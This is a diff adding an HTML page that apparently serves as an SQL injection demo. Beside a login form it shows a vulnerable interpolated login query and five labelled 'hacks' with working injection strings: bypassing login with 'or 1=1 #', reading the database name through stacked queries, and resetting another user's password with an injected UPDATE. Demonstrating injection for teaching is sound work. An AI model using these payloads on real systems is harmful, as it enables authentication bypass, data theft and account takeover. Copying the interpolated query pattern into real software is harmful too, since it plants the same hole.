@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Login Form</title>
+    <link rel="stylesheet" type="text/css" href="welcome.css" />
+</head>
+
+<body>
+    <h1>Login</h1>
+    <form id="login-form" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required /><br /><br />
+
+        <label for="password">Password:</label>
+        <div class="password-input">
+            <input type="password" id="password" name="password" required />
+            <button type="button" id="toggle-password">Show</button>
+        </div>
+        <br /><br />
+
+        <input type="submit" value="Login" />
+    </form>
+
+    <div id="generalResponse"></div>
+    <div id="result"></div>
+
+    <div style="
+        height: 100px;
+        color: white;
+        background-color: black;
+        font-size: medium;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      " id="yourQuery"></div>
+    <div id="table">
+        <table id="userTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Email</th>
+                    <th>Created At</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Table rows will be added here dynamically -->
+            </tbody>
+        </table>
+    </div>
+    <div style="
+        background-color: black;
+        color: #fff;
+        text-align: center;
+        padding: 10px;
+      ">
+        <h1 style="color: white">hack 1 get all users knowing the user</h1>
+        <p style="font-style: italic; color: red">
+            original const query = `SELECT * FROM users WHERE username = '${user}'
+            AND password = '${pass}'`;
+        </p>
+        <p style="font-style: italic; color: red">
+            used query your query is => SELECT * FROM users WHERE username = 'user1
+            ' or 1=1 #' AND password = 'a'
+        </p>
+        <p style="font-style: italic">
+            inserting this in the user field and random password (<span style="color: violet;">user1 ' or 1=1 #</span>)
+        </p>
+    </div>
+
+    <div style="
+        background-color: black;
+        color: #fff;
+        text-align: center;
+        padding: 10px;
+      ">
+        <h1 style="color: white">
+            hack 2 specific user knowing the user but not the password
+        </h1>
+        <p style="font-style: italic; color: red">
+            original const query = `SELECT * FROM users WHERE username = '${user}'
+            AND password = '${pass}'`;
+        </p>
+        <p style="font-style: italic; color: red">
+            used Query your query is => SELECT * FROM users WHERE username = 'user1'
+            #' AND password = 'a'
+        </p>
+        <p style="font-style: italic">
+            inserting this in the user field and random password (<span style="color: violet;">user1' #</span>)
+        </p>
+    </div>
+
+
+
+    <div style="
+            background-color: black;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+          ">
+        <h1 style="color: white">
+            hack 3 getting the user table without knowing nor password or user
+        </h1>
+        <p style="font-style: italic; color: red">
+            original const query = `SELECT * FROM users WHERE username = '${user}'
+            AND password = '${pass}'`;
+        </p>
+        <p style="font-style: italic; color: red">
+            your query is => SELECT * FROM users WHERE username = 'randomuser' or 1=1 #' AND password = 'a'
+
+        <p style="font-style: italic">
+            inserting this in the user field and random password (<span style="color: violet;">randomuser' or 1=1
+                #</span>)
+        </p>
+    </div>
+
+
+    <div style="
+                background-color: black;
+                color: #fff;
+                text-align: center;
+                padding: 10px;
+              ">
+        <h1 style="color: white">
+            hack 4 after accessing the system using multiple queries 😈
+        </h1>
+        <p style="font-style: italic; color: red">
+            original const query = `SELECT * FROM users WHERE username = '${user}'
+            AND password = '${pass}'`;
+        </p>
+        <p style="font-style: italic; color: red">
+            your query is => SELECT * FROM users WHERE username = 'user1' ; select database();#' AND password = 'random'
+
+        <p style="font-style: italic">
+            inserting this in the user field and random password (<span style="color: violet;">user1' ; select
+                database();#</span>)
+        </p>
+    </div>
+
+    <div style="
+                    background-color: black;
+                    color: #fff;
+                    text-align: center;
+                    padding: 10px;
+                  ">
+        <h1 style="color: white">
+            hack 4 after accessing the system using multiple destroy someone account 😈
+        </h1>
+        <p style="font-style: italic; color: red">
+            original const query = `SELECT * FROM users WHERE username = '${user}'
+            AND password = '${pass}'`;
+        </p>
+        <p style="font-style: italic; color: red">
+            your query is => SELECT * FROM users WHERE username = 'user1' ; UPDATE sqlInjection.users SET password =
+            'newPassword'
+            WHERE username='user1' #' AND password = 'a'
+        <p style="font-style: italic">
+            inserting this in the user field and random password (<span style="color: violet;">user1' ; UPDATE
+                sqlInjection.users SET password =
+                'newPassword' WHERE username='user1' #</span>)
+        </p>
+    </div>
+
+    <script type="module" src="/welcome.js"></script>
+</body>
+
+</html>
